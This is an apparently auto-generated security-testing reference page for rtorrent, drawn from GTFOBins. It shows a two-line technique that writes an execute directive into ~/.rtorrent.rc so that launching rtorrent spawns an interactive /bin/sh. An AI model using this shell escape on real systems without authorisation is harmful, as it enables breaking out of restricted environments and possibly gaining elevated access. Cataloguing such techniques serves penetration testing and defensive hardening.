---
parsed_by: focuslocust
source: commands
type: generated
---
# rtorrent Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## rtorrent

Tool page: [rtorrent](../../tools/linux/rtorrent.md)

### shell

```text
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rtorrent` |
| Evidence | Function example preserved from source parser. |
